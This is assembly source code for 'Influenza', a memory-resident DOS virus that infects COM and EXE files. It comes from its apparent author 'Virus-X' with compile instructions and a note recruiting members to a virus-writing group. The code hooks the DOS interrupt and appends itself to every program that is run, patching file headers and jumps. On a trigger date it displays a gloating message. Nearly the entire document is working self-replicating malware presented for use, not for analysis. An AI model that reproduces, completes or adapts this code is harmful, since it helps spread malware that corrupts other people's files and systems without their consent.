;Note (hehe,. almost forgot this): Virus-x has started a group called JVS. Mail 
;him to apply.


;*********************************************
;*Influenza Virus                            *
;*type:TSR COM/EXE  infector                 *
;*author:Virus-X                             *
;*report any bugs to:janus_virus@hotmail.com *
;*********************************************
;compile: tasm Influenza.asm  Tlink  influenza.obj
;exe2bin influenza.exe influenza.com

.model tiny
.286
.code 
org 0h
start:
	push ds                                       ;save ds segment
	push cs cs                                    ;save all cs
	pop es ds                                     ;ES  info
	call deltaoff
deltaoff:
	pop bp                                        ;pop bp onto stack
	sub bp,offset deltaoff                        ;get delta offset

residency:
	mov ax,9999h
	int 21h
	cmp ax,0
	je exit_virus
;                       TSR
;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
install_virus:
	mov ax,3521h
	int 21h
	mov word ptr cs:[bp+old21],bx
	mov word ptr cs:[bp+old21+2],es
	mov  ah,4ah                                   ;request memory 
	mov  bx,0ffffh                                ;way to much
	int  21h                                      ;DOS                                    
	mov  ax,4ah                                   ;Request memory
	sub  bx,(endvirus-start+15)/16+1              ;for virus
	int  21h                                      ;DOS                       
	mov  ax,48h                                   ;allocate mem
	mov  bx,(endvirus-start+15)/16                ;virus size
	int  21h                                      ;GO DOS                            
	dec  ax                                       ;decrement AX vlaue
	mov  es,ax                                    ;get MCB off ds                       
	mov byte ptr es:[0],'Z'                       ;set as last block
	mov word ptr es:[8],8                         ;owner DOS (sure  it is)              
	inc    ax                            
	mov    es,ax
	push   cs
	pop    ds
	xor    di,di
	lea    si,[bp+start]
	mov    cx,endvirus-start
	rep    movsb                                  ;copy virus to memory    

	mov ax,2521h
	push ds
	pop es
	mov dx,offset virus
	int 21h
exit_virus:
	mov ah,2ah
	int 21h
	cmp dh,11
	jne contEXIT
	cmp dl,30
	jne contEXIT
	mov ah,9h
	lea dx,[bp+virusmessage]
	int 21h
contEXIT:
	cmp byte ptr [bp+counter],1
	je comvir_exit
restorebytes: 
	mov cx,4                                      ;4*2=8
	lea     si,[bp+EXE_IP]                        ;this is what we want      
	lea     di,[bp+SAVED_IP]                      ;this is where we want it
	rep movsw                                     ;relocate saved header nfo 
	pop ds                                        ;restore DS
	push ds                                                
	pop es                                        
	mov ax,es                                            
	add  ax,10h                                          
	add word ptr cs:[bp+saved_cs],ax              ;restore CS                
	cli                                           ;clear interrupt flags         
	add     ax,word ptr cs:[bp+Saved_SS]          ;restore SS         
	mov     ss,ax                                 ;Ax =SS         
	mov     sp,word ptr cs:[bp+Saved_SP]          ;restore SP         
	sti                                           ;enable interupt flags  
                                    
	    db 0eah                           ;Jump far to CS:IP                                     
saved_ip    dw  0                             ;where EXE_IP will be
saved_cs    dw  0                             ;where EXE_CS will be
saved_sp    dw  0                             ;where EXE_SP will be
saved_ss    dw  0                             ;where EXE_SS will be

comvir_exit:
	lea si,[bp+byte4]
	mov di,100h
	mov cx,4
	rep movsb
	mov ax,100h
	jmp ax
;                       Int Handler
;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
Virus:
	pushf
	cmp ax,9999h
	jne reproduction
	xor ax,ax
	popf
	iret
reproduction:
	cmp  ah,4bh
	je infect
	jmp  int_exit
infect:
	pusha
	push ds
	push es
	mov ax,3d02h
	int 21h
	xchg ax,bx

	mov ah,3fh
	mov cx,1ch
	lea dx,[cs:exeheader]
	int 21h
	cmp  word ptr cs:[exeheader],'MZ'
	je check2
	cmp word ptr cs:[exeheader],'ZM'
	je check2
	jmp com_infection
check2:
	cmp word ptr cs:[exeheader+18h],'@'
	jne check3
	jmp close
check3:
	cmp word ptr cs:[exeheader+1Ah],0
	jne close
	cmp word ptr cs:[exeheader+12h],'VX'
	je close
	call save_header
	mov ax,4202h
	xor cx,cx
	cwd
	int 21h
	push ax dx
	mov cx,10h
	div cx
	sub ax,word ptr cs:[exeheader+8h]
	mov word ptr cs:[exeheader+14h],dx          ;set new IP
	mov word ptr cs:[exeheader+16h],ax          ;set new CS
	mov word ptr cs:[exeheader+0eh],ax          ;set new SS
	mov word ptr cs:[exeheader+10h],0fffeh      ;set new SP
	mov word ptr cs:[exeheader+12h],'VX'        ;infection marker
	pop dx ax                                   ;restore original file size
	add ax,endvirus-start                       ;add virus size to file size
	adc dx,0                                    ;add carry
	mov cx,200h                                 ;200h = 512
	div cx                                      ;divide file size into pages
	cmp dx,0                                    ;is DX 0
	je continue                                 ;yes continue
	inc ax                                  ;no inc AX for rounding purposes                                   
continue:
	mov word ptr cs:[exeheader+4h],ax           ;set new PartPag
	mov word ptr cs:[exeheader+2h],dx           ;set new PageCnt
	mov byte ptr cs:[counter],0
	push cs
	pop ds
	mov ah,40h
	mov cx,endvirus-start
	mov dx,offset start
	int 21h
	mov ax,4200h
	xor cx,cx
	cwd
	int 21h
	push cs
        pop ds
	mov ah,40h
	mov cx,1Ch
	lea dx,[cs:exeheader]
	int 21h
close:
	mov ah,3eh
	int 21h
	jmp int_exit
com_infection:
	mov ax,4200h
	xor cx,cx
	cwd
	int 21h
	push cs
	pop ds
	mov ah,3fh
	mov cx,4
	lea dx,[cs:byte4]
	int 21h
	cmp byte ptr cs:[byte4+3],'V'
	jne all_ok
	jmp close
all_ok:
	mov ax,4200h
	xor cx,cx
	cwd
	int 21h
	mov ax,4202h
	xor cx,cx
	cwd
	int 21h
	sub ax,3
	mov word ptr [cs:newjump+1],ax
	mov ax,4200h
	xor cx,cx
	cwd
	int 21h
	push cs
	pop ds
	mov ah,40h
	mov cx,4
	lea dx,[cs:newjump]
	int 21h
	mov ax,4202h
	xor cx,cx
	cwd
	int 21h
	mov byte ptr cs:[counter],1
	push cs
	pop ds
	mov ah,40h
	mov cx,endvirus-start
	mov dx,offset start
	int 21h
	jmp close



int_exit:
	popf
	popa
	pop ds
	pop es

      db 0eah
old21 dd ?
;                     Procedures
;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
save_header:
	mov ax,word ptr cs:[exeheader+10h]            ;ax = SP
	mov word ptr cs:[exe_sp],ax                   ;save SP
	mov ax,word ptr cs:[exeheader+16h]            ;ax = CS
	mov word ptr cs:[exe_cs],ax                   ;save CS
	mov ax,word ptr cs:[exeheader+14h]            ;ax = ip
	mov word ptr cs:[exe_ip],ax                   ;save IP
	mov ax,word ptr cs:[exeheader+0eh]            ;ax = SS
	mov word ptr cs:[exe_ss],ax                   ;save SS
	ret                                           ;return

;                                DATA
;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
newjump   db 0e9h,0,0,'V'
byte4     db 0cdh,20h,0,0
exeheader db 1Ch dup (?)
counter   db 0
exe_ip    dw 0                                ;storage for IP
exe_cs    dw 0fff0h                           ;storage for CS
exe_sp    dw 0                                ;storage for SP
exe_ss    dw 0fff0h                           ;storage for SS

virusmessage db 'InFLuEnZA Virus has  infected  your PC',10,13
             db 'your PC is nautious',10,13,'$'

created	     db  'By Virus-X /Janus Virus Syndicate',0



endvirus label near
end start


